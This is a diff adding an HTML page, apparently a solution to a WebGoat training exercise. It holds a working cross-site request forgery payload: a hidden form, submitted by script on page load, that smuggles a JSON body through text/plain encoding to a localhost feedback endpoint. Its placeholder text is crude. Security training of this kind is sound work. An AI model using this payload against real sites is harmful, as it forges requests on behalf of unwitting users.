@@ -1,0 +1,13 @@
+<html>
+    <body>
+        <form action="http://localhost:8080/WebGoat/csrf/feedback/message" method="POST" enctype="text/plain">
+            <input type="hidden"
+                   name="{&quot;message&quot;:&quot;people"
+                   value="shit!!!&quot;,&quot;name&quot;:&quot;hackerman&quot;,&quot;email&quot;:&quot;plumber@yourmother.org&quot;,&quot;subject&quot;:&quot;service&quot;}"
+            />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
